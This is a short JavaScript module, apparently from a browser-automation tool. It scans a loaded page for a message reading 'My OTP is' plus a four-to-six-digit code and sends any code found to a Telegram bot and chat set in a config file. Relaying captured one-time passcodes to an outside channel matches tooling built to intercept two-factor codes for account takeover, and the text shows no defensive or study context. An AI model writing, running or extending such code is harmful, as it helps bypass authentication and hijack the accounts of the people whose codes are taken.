const { sendToTelegram } = require('./telegram');
const config = require('./config');

async function extractSMS(page) {
    const content = await page.content();
    const match = content.match(/My OTP is\s*(\d{4,6})/i);

    if (match) {
        const otp = match[1];
        console.log("[OTP FOUND] =>", otp);
        sendToTelegram(config.TELEGRAM_BOT_TOKEN, config.TELEGRAM_CHAT_ID, `🔐 OTP: ${otp}`);
    } else {
        console.log("[*] No OTP found...");
    }
}

module.exports = { extractSMS };